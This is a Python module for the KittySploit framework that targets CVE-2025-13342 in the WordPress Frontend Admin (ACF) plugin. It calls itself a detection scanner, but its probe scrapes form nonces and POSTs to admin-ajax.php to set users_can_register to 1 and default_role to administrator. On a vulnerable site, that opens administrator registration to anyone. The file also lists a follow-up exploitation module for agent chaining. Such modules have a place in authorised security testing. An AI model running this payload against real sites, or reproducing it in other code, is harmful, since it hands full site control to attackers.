#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Frontend Admin (ACF) <= 3.28.20 options BAC (CVE-2025-13342)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "acf-frontend-form-element"
_VULN_HIGH = (3, 28, 20)
_PATHS = (
    "/",
    "/submit-post/",
    "/register/",
    "/signup/",
    "/frontend-form/",
    "/submit-form/",
)


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "DynamiApps Frontend Admin CVE-2025-13342 detect",
        "description": (
            "Detects frontend form with _acf_nonce; probes admin_options users_can_register."
        ),
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2025-13342",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2025-13342"],
        "modules": ["auxiliary/admin/http/dynamiapps_fe_admin_cve_2025_13342_options_bac"],
        "tags": ["web", "scanner", "wordpress", "frontend-admin", "bac", "cve-2025-13342"],
        "agent": {
            "approval_required": True,
            "chain": {
                "suggested_followups": ["auxiliary/admin/http/dynamiapps_fe_admin_cve_2025_13342_options_bac"],
            },
        },
    }

    base_path = OptString("/", "WordPress base path", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.base_path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def _scrape(self, html: str):
        nonce_m = re.search(r'name="_acf_nonce"[^>]*value="([a-f0-9]+)"', html)
        form_m = re.search(r'name="_acf_form"[^>]*value="([^"]+)"', html)
        return (nonce_m.group(1), form_m.group(1)) if nonce_m and form_m else None

    def run(self):
        base = self.wp_normalize_base_path(self.base_path or "/")
        version = self.wp_plugin_version(_PLUGIN, base) or ""
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        for rel in _PATHS:
            page = self.http_request(method="GET", path=self._join(rel), allow_redirects=True)
            if not page or "frontend-form" not in (page.text or ""):
                continue
            scraped = self._scrape(page.text or "")
            if not scraped:
                continue
            nonce, form = scraped
            resp = self.http_request(
                method="POST",
                path=self._join("/wp-admin/admin-ajax.php"),
                headers={"X-Requested-With": "XMLHttpRequest"},
                data={
                    "_acf_nonce": nonce,
                    "_acf_form": form,
                    "action": "frontend_admin/form_submit",
                    "acff[admin_options][users_can_register]": "1",
                    "acff[admin_options][default_role]": "administrator",
                },
                allow_redirects=False,
            )
            body = resp.text or "" if resp else ""
            if resp and int(resp.status_code or 0) == 200 and "invalid_nonce" not in body and "-1" not in body:
                self.set_info(
                    severity="critical",
                    reason="Frontend Admin form_submit modified registration options",
                    path=rel,
                    cve="CVE-2025-13342",
                )
                return True
        return False
